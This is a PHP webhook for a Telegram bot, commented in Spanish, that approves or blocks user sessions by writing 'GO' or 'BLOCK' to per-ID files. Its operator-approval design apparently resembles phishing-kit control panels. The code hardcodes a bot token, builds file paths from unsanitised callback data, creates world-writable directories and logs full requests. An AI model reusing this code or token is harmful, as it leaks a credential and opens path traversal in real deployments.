<?php

/* ========================= */
/* 🔐 SEGURIDAD TELEGRAM */
/* ========================= */


$token = "8687740380:AAGGYi6lL882l7Vv6JSYJwkFPZ1byk0pcRA";

$input = file_get_contents("php://input");
$update = json_decode($input, true);
file_put_contents("debug_full_callback.txt", json_encode($update, JSON_PRETTY_PRINT) . "\n", FILE_APPEND);

/* SI NO HAY DATOS */
if(!$update){
    echo "OK";
    exit;
}

/* ========================= */
/* BOTÓN TELEGRAM */
/* ========================= */

if(isset($update["callback_query"])){
file_put_contents("debug_bot.txt", "BOT ACTIVADO\n", FILE_APPEND);
    $callback_id = $update["callback_query"]["id"] ?? '';
    $chat_id = $update["callback_query"]["from"]["id"] ?? '';
    $data = $update["callback_query"]["data"] ?? '';

    if(!$data){
        exit("Sin data");
    }

    /* RESPONDER A TELEGRAM */
    file_get_contents(
        "https://api.telegram.org/bot$token/answerCallbackQuery?callback_query_id=$callback_id"
    );

    /* ✅ APROBAR */
    if(strpos($data, "GO_") === 0){

      $parts = explode("_", $data, 2);
$id = $parts[1] ?? '';

if(!$id){
    file_put_contents("debug_error.txt", "ID VACIO\n", FILE_APPEND);
    exit("ID VACIO");
}

        $dir = __DIR__ . "/sesiones/";

        if(!file_exists($dir)){
            mkdir($dir, 0777, true);
        }

        $file = $dir . $id . ".txt";

      file_put_contents($file, "GO", LOCK_EX);
file_put_contents("debug_write.txt", "GO -> $file\n", FILE_APPEND);;

        file_get_contents(
            "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=✅ Usuario aprobado ID:$id"
        );
    }

    /* 🚫 BLOQUEAR */
    if(strpos($data, "BLOCK_") === 0){

     $parts = explode("_", $data, 2);
$id = $parts[1] ?? '';

if(!$id){
    file_put_contents("debug_error.txt", "ID VACIO\n", FILE_APPEND);
    exit("ID VACIO");
}

        $dir = __DIR__ . "/sesiones/";

        if(!file_exists($dir)){
            mkdir($dir, 0777, true);
        }

        $file = $dir . $id . ".txt";

        file_put_contents($file, "BLOCK", LOCK_EX);
file_put_contents("debug_write.txt", "BLOCK -> $file\n", FILE_APPEND);

        file_get_contents(
            "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=🚫 Usuario bloqueado ID:$id"
        );
    }
}

/* RESPUESTA FINAL */
echo "OK";
